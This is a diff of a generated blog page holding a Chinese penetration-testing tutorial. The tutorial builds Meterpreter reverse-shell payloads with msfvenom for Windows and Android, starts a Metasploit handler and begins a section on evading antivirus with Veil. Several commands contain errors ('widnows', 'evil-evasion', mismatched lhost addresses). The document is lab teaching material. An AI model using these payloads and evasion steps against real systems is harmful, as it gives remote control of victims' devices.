@@ -31,7 +31,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
@@ -434,7 +434,8 @@
 <li>一个是在目标系统完成指定任务的程序B<br>进行渗透的时候，我们将子程序A和子程序B一起发送到目标系统的特定端口上，子程序A会利用目标系统的漏洞，在目标系统上执行子程序B，子程序B的作用是在目标上执行一些任务，比如远程控制、信息监听、文件下载等。</li>
 </ul>
 <h2 id="渗透测试模块"><a href="#渗透测试模块" class="headerlink" title="渗透测试模块"></a>渗透测试模块</h2><p>如果把漏洞比作是一栋建筑物中上了锁的入口的话，那么我们现在需要做的就是一把能打开入口的钥匙,这把钥匙就是渗透测试模块(子程序A)，我们的工作就是要找到这个渗透测试模块。我们可以通过<a href="https://www.exploit.db.com/" target="_blank" rel="noopener">https://www.exploit.db.com/</a> 来搜索渗透测试模块，也可以使用kali linux自带的漏洞库。(请参阅渗透测试(5))<br>查找某个软件漏洞的方式是在终端输入以下命令：(此处以easyFileSharing为例)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 软件名</span><br><span class="line">searchsploit easy file sharing</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">searchsploit 软件名
+searchsploit easy <span class="token function">file</span> sharing </code></pre>
 <h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><p>上文中我们把漏洞渗透模块比作一把进入目标系统的钥匙，现在我们已经获得了这把钥匙，接下来可以把一段代码(Shellcode)送到目标系统并执行。</p>
 <h3 id="远程控制程序"><a href="#远程控制程序" class="headerlink" title="远程控制程序"></a>远程控制程序</h3><p>指的是可以在一台设备上操纵另一台设备的软件。远程控制程序分为两个部分，被控端和主控端。远程控制软件的分类有很多，最为常用的两个标准如下所示:</p>
 <ul>
@@ -449,7 +450,7 @@
 <li>输出payload位置</li>
 </ol>
 <p>在kali中生成远程控制被控端程序，在kali终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.190.134 lport=5000 -f exe -o /root/payload.exe</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.190.134 lport<span class="token operator">=</span>5000 -f exe -o /root/payload.exe</code></pre>
 <ul>
 <li><font color="#fb8c00">-p</font> 指定要生成的payload(攻击载荷)，如果要使用自定义的payload，则使用<font color="#fb8c00">-</font>或<font color="#fb8c00">stdin</font>指定，上例中的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font>是一个用于Windows平台下的反向远程控制程序。</li>
 <li><font color="#fb8c00">lhost</font> 指定接收被控端信息的主机(攻击载荷的参数之一)</li>
@@ -461,18 +462,19 @@
 <p>注：上述lhost、lport都是攻击载荷的参数，攻击载荷不同，需要设置的参数也不同，可以使用 </p>
 </blockquote>
 <h3 id="在kali中启动主控端"><a href="#在kali中启动主控端" class="headerlink" title="在kali中启动主控端"></a>在kali中启动主控端</h3><p>在主控端主机(kali)中启动metasploit(请参阅渗透测试(5)):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">msfconsole </code></pre>
 <p>在Metasploit使用handler来作为主控端：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> use exploit/multi/handler</code></pre>
 <p>对主控端进行设置：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; <span class="built_in">set</span> payload widnows/meterpreter/reverse_tcp   //设置攻击载荷</span><br><span class="line">msf&gt; <span class="built_in">set</span> lhost 192.168.190.135   //设置攻击载荷的参数</span><br><span class="line">msf&gt; <span class="built_in">set</span> lport 5000              //设置攻击载荷的参数</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> <span class="token keyword">set</span> payload widnows/meterpreter/reverse_tcp   //设置攻击载荷
+msf<span class="token operator">></span> <span class="token keyword">set</span> lhost 192.168.190.135   //设置攻击载荷的参数
+msf<span class="token operator">></span> <span class="token keyword">set</span> lport 5000              //设置攻击载荷的参数</code></pre>
 <p>执行攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; exploit</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> exploit</code></pre>
 <p>整体过程如下，出现最后一行表示攻击程序启动成功<br><img src="https://i.postimg.cc/k4qRbDT3/1.jpg" alt=""></p>
 <p>在被控端(windowsXP)打开payload.exe文件，然后会在主控端出现以下字样，表示已经成功取得被控端的控制权，在<font color="#fb8c00">meterpreter</font>后输入相关操作对被控端(WindowsXP)进行控制。<br><img src="https://i.postimg.cc/Ssd27qPX/2.png" alt=""></p>
 <h2 id="meterpreter在各种操作系统中的应用"><a href="#meterpreter在各种操作系统中的应用" class="headerlink" title="meterpreter在各种操作系统中的应用"></a>meterpreter在各种操作系统中的应用</h2><p>上述我们使用的被控端程序是基于Metasploit中提供的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font>生成的。Metasploit分类下提供大量的被控端程序，后面介绍的payload也可以等同于被控端程序，，使用如下命令可以查看所有可使用的payload：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">msfvenom -l payloads</code></pre>
 <p>得到的结果如图所示：<br><img src="https://i.postimg.cc/brvGmWXm/3.jpg" alt=""><br><font color="#fb8c00">Name</font>为Payload的名称，<font color="#fb8c00">Description</font>是对漏洞的描述。</p>
 <ul>
 <li>所有payload模块的名字都使用三段式的标准，就是采用针对的操作系统+控制方式+模块具体名称组成，比如上例中的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font></li>
@@ -480,23 +482,29 @@
 <li>在最后面的模块名称中一般会表明是正向还是反向方式，以及采用哪一种网络协议进行传输。</li>
 </ul>
 <p>每个Payload在使用的时候都需要设置一些参数，可以使用选项<font color="#fb8c00">–payload-options</font>来查看这个payload需要设置的参数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --payload-options</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp --payload-options</code></pre>
 <h3 id="meterpreter在安卓系统的应用"><a href="#meterpreter在安卓系统的应用" class="headerlink" title="meterpreter在安卓系统的应用"></a>meterpreter在安卓系统的应用</h3><p>测试用的手机应与kali计算机连在同一局域网内(kali虚拟机采用桥接模式)<br>在Kali平台下实施如下操作</p>
 <ol>
-<li>创建andriod平台下的远程控制程序:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.190.138 lport=5000 R&gt;/root/payload.apk</span><br></pre></td></tr></table></figure></li>
+<li>创建andriod平台下的远程控制程序:<pre class=" language-bash"><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.190.138 lport<span class="token operator">=</span>5000 R<span class="token operator">></span>/root/payload.apk</code></pre>
+</li>
 </ol>
 <ul>
 <li><font color="#fb8c00">R&gt;</font> 因为msfvenom命令中默认没有apk这种可以直接在Android操作系统执行的文件格式，使用此参数可以保持文件原格式，就不必再使用<font color="#fb8c00">-f -o</font>指定输出格式和输出文件的位置。</li>
 <li>其他所有参数与攻击Windows操作系统下的命令含义相同。</li>
 </ul>
 <ol start="2">
-<li>在Metasploit中执行以下命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.190.138</span><br><span class="line"><span class="built_in">set</span> lport 5000</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li>
+<li>在Metasploit中执行以下命令：<pre class=" language-bash"><code class="language-bash">use exploit/multi/handler
+<span class="token keyword">set</span> payload android/meterpreter/reverse_tcp
+<span class="token keyword">set</span> lhost 192.168.190.138
+<span class="token keyword">set</span> lport 5000
+exploit</code></pre>
+</li>
 <li>在手机上启动payload.apk程序，即可在kali上执行远程控制程序。</li>
 <li>连接成功过后使用<font color="#fb8c00">help</font>命令可以查看meterpreter在android系统中适用的指令</li>
 </ol>
 <h2 id="使用Veil-Evasion绕过杀毒软件"><a href="#使用Veil-Evasion绕过杀毒软件" class="headerlink" title="使用Veil-Evasion绕过杀毒软件"></a>使用Veil-Evasion绕过杀毒软件</h2><h3 id="安装veil-Evasion"><a href="#安装veil-Evasion" class="headerlink" title="安装veil-Evasion"></a>安装veil-Evasion</h3><p>kali并没有安装好Veil,在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install evil-evasion</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> evil-evasion</code></pre>
+
             </div>
             <hr/>
 
@@ -532,7 +540,7 @@
                   property="dct:title" rel="dct:type">
                     《渗透测试(4)》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/17/penetrationTest4/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/17/penetrationtest4/" property="cc:attributionName"
                rel="cc:attributionURL">
                 fightingtree
             </a> 采用
@@ -651,7 +659,7 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/14/penetrationTest3/">
+                <a href="/2019/11/14/penetrationtest3/">
                     <div class="card-image">
                         
                         
@@ -859,7 +867,7 @@
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
             站点总字数:&nbsp;
-                <span class="white-color">169.5k</span>
+                <span class="white-color">166.6k</span>
             
             </div>
         <div class="col s12 m8 l8 copy-right">
